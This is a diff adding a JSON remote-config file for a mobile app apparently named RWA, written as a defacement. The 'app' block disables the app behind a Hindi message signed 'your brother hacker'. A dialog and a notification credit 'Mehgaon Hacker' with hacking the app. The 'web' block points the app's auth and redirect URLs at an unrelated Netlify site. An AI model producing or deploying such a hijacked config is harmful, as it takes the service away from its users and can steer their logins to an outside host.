@@ -1,1 +1,26 @@
+{
+  "app": {
+    "enable": true,
+    "title": "App Disabled",
+    "message": "कुछ देर इंतजार करें अभी RWA का सर्वर मैं प्रॉब्लम है इसीलिए अपना ऐप नहीं चल रहा है एक-दो घंटे में अपने आप सही हो जाएगा आपका भाई हैकर",
+    "cancelable": false
+  },
 
+  "web": {
+  "auth_url": "http://rgvikramjeetv1.netlify.app",
+  "redirect_url": "http://rgvikramjeetv1.netlify.app"
+},
+
+  "dialog": {
+    "enable": true,
+    "title": "❤️Important Notice by Hacker❤️",
+    "message": "🙏🙏Hello dosto mera app kisi hacker ne hack kar liya please koi bhi password enter mat karna. 🙏🙏apka bhai Mehgaon Hacker",
+    "cancelable": true
+  },
+
+  "notification": {
+    "enable": true,
+    "title": "RWA Update from MehgaonHacker",
+    "message": "apka bhai Mehgaon Hacker"
+  }
+}
